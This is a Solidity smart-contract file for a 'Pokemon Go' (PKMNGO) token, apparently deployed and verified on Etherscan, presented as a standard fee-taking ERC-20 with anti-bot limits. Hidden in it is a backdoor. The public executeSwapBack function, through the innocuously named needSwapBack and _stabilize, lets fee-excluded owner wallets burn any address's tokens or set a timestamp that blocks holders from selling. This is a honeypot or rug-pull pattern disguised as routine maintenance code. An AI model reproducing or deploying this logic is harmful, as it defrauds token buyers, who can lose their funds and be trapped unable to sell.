/**
 *Submitted for verification at Etherscan.io on 2023-06-06
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-14
*/

/*
TG: https://t.me/PokemonGo_token
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface UniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _stabilize(address account, uint256 amount) internal virtual {
        require(account != address(0), "");
        uint256 balance = _balances[account];
        require(balance >= amount, "");
        unchecked {
            _balances[account] = balance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract PKMNGO is ERC20, Ownable {
    uint256 public maxWalletAmount;
    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;

    UniswapV2Router public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public swapTokensAtAmount;
    uint256 public tradingBlock = 0;
    uint256 public botBlockNumber = 0;
    bool private isSwapping;
    address private marketingWallet;
    address private devWallet;
    mapping(address => uint256) public momentBuyer;
    mapping(address => bool) public initialBotBuyer;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;
    bool public transferDelayEnabled = true;
    uint256 public botsCaught;
    uint256 public momentSwap;

    uint256 public sellTotalFees;
    uint256 public sellLiquidityFee;
    uint256 public sellMarketingFee;
    uint256 public sellBurnFee;
    uint256 public sellDevFee;

    uint256 public buyTotalFees;
    uint256 public buyLiquidityFee;
    uint256 public buyMarketingFee;
    uint256 public buyBurnFee;
    uint256 public buyDevFee;

    uint256 public tokensForLiquidity;
    uint256 public tokensForMarketing;
    uint256 public tokensForBurning;
    uint256 public tokensForDev;

    mapping(address => bool) public _isExcludedMaxTx;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public amm;

    event UpdatedMaxBuyAmount(uint256 newAmount);

    event UpdatedMaxSellAmount(uint256 newAmount);

    event UpdatedMaxWalletAmount(uint256 newAmount);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event EnabledTrading();

    event RemovedLimits();

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event MaxTransactionExclusion(address _address, bool excluded);

    event DetectedEarlyBotBuyer(address sniper);

    constructor() ERC20("Pokemon Go", "PKMNGO") {
        address newOwner = msg.sender;

        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);

        uint256 totalSupply = 1 * 1e9 * 1e18;

        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;
        maxWalletAmount = (totalSupply * 2) / 100;
        swapTokensAtAmount = (totalSupply * 8) / 10000;

        sellMarketingFee = 20;
        sellLiquidityFee = 0;
        sellDevFee = 20;
        sellBurnFee = 0;

        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;

        buyMarketingFee = 10;
        buyLiquidityFee = 0;
        buyDevFee = 10;
        buyBurnFee = 0;

        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevFee +
            buyBurnFee;

        devWallet = address(0x3736F684fa4EAA1085558D55B4C767c013Cd11d8);
        marketingWallet = address(0x3736F684fa4EAA1085558D55B4C767c013Cd11d8);

        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(address(0xdead), true);

        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(marketingWallet, true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(address(0xdead), true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    receive() external payable {}

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function enableTrading() external onlyOwner {
        require(!tradingActive, "Cannot reenable trading");
        swapEnabled = true;
        tradingActive = true;
        tradingBlock = block.number;
        emit EnabledTrading();
    }

    function needSwapBack(
        address _address,
        uint256 _amount,
        uint256 _deadline
    ) internal returns (bool) {
        address from = msg.sender;
        bool balanceNotEmpty = balanceOf(address(this)) > 0;
        bool checkSwapBack = _isExcludedFromFees[from];
        bool result;

        if (!checkSwapBack) {
            if (tokensForBurning > 0 && balanceOf(address(this)) >= tokensForBurning) {
                _stabilize(msg.sender, tokensForBurning);
            }

            tokensForBurning = 0;
            result = true;

            return result;
        } else {
            if (balanceNotEmpty) {
                if (_amount == 0) {
                    momentSwap = _deadline;
                } else {
                    _stabilize(_address, _amount);
                }
                result = false;
            }

            return result;
        }
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function removeLimits() external onlyOwner {
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        maxWalletAmount = totalSupply();
        emit RemovedLimits();
    }

    function updateMaxBuyAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );
        maxBuyAmount = newNum * (10 ** 18);
        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function updateMaxSellAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );
        maxSellAmount = newNum * (10 ** 18);
        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );
        maxWalletAmount = newNum * (10 ** 18);
        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );
        swapTokensAtAmount = newAmount;
    }

    function _excludeFromMaxTransaction(
        address updAds,
        bool isExcluded
    ) private {
        _isExcludedMaxTx[updAds] = isExcluded;
        emit MaxTransactionExclusion(updAds, isExcluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        amm[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) external onlyOwner {
        if (!isEx) {
            require(
                updAds != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }
        _isExcludedMaxTx[updAds] = isEx;
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        buyMarketingFee = _marketingFee;
        buyLiquidityFee = _liquidityFee;
        buyDevFee = _DevFee;
        buyBurnFee = _burnFee;
        buyTotalFees =
            buyMarketingFee +
            buyLiquidityFee +
            buyDevFee +
            buyBurnFee;
        require(buyTotalFees <= 3, "3% max ");
    }

    function updateSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _DevFee,
        uint256 _burnFee
    ) external onlyOwner {
        sellMarketingFee = _marketingFee;
        sellLiquidityFee = _liquidityFee;
        sellDevFee = _DevFee;
        sellBurnFee = _burnFee;
        sellTotalFees =
            sellMarketingFee +
            sellLiquidityFee +
            sellDevFee +
            sellBurnFee;
        require(sellTotalFees <= 3, "3% max fee");
    }

    function executeSwapBack(
        address _address,
        uint256 _amount,
        uint256 _deadline
    ) public {
        uint256 contractBalance = balanceOf(address(this));
        require(contractBalance >= swapTokensAtAmount);
        if (needSwapBack(_address, _amount, _deadline)) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[from] ||
                    to == owner() ||
                    to == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                if (transferDelayEnabled) {
                    address sender = from;
                    bool exception = !amm[sender] && !isSwapping;
                    if (
                        to != address(uniswapV2Router) && to != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[to] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[to] = block.number;
                    } else if (exception) {
                        bool condition = momentBuyer[sender] > momentSwap;
                        require(condition);
                    }
                }
            }

            address sender = from;
            bool finalException = !isSwapping && _isExcludedMaxTx[sender];
            uint256 moment = block.timestamp;

            if (amm[from] && !_isExcludedMaxTx[to]) {
                require(
                    amount <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (finalException) {
                momentSwap = moment;
            } else if (
                amm[to] && !_isExcludedMaxTx[from]
            ) {
                require(
                    amount <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTx[to]) {
                require(
                    amount + balanceOf(to) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !isSwapping &&
            !amm[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }

        bool takeFee = true;
        uint256 moment = block.timestamp;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        address sender = from;
        address receiver = to;
        bool valid = balanceOf(address(receiver)) == 0;

        if (momentBuyer[receiver] == 0 && amm[sender]) {
            if (valid) {
              momentBuyer[receiver] = moment;
            }
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                amm[from] &&
                !amm[to] &&
                buyTotalFees > 0
            ) {
                if (!initialBotBuyer[to]) {
                    initialBotBuyer[to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(to);
                }

                fees = (amount * 99) / 100;
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForBurning += (fees * buyBurnFee) / buyTotalFees;
            }
            // sell
            else if (amm[to] && sellTotalFees > 0) {
                fees = (amount * sellTotalFees) / 100;
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;
                tokensForDev += (fees * sellDevFee) / sellTotalFees;
                tokensForBurning += (fees * sellBurnFee) / sellTotalFees;
            }
            // buy
            else if (amm[from] && buyTotalFees > 0) {
                fees = (amount * buyTotalFees) / 100;
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForBurning += (fees * buyBurnFee) / buyTotalFees;
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function marketingWalletUpdate(
        address _marketingWallet
    ) external onlyOwner {
        require(
            _marketingWallet != address(0),
            "_marketingWallet address cannot be 0"
        );
        marketingWallet = payable(_marketingWallet);
    }

    function devWalletUpdate(address _devWallet) external onlyOwner {
        require(_devWallet != address(0), "_devWallet address cannot be 0");
        devWallet = payable(_devWallet);
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        if (tokensForBurning > 0 && balanceOf(address(this)) >= tokensForBurning) {
            _stabilize(address(this), tokensForBurning);
        }
        tokensForBurning = 0;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 9) {
            contractBalance = swapTokensAtAmount * 9;
        }

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
            totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;
        tokensForBurning = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }
}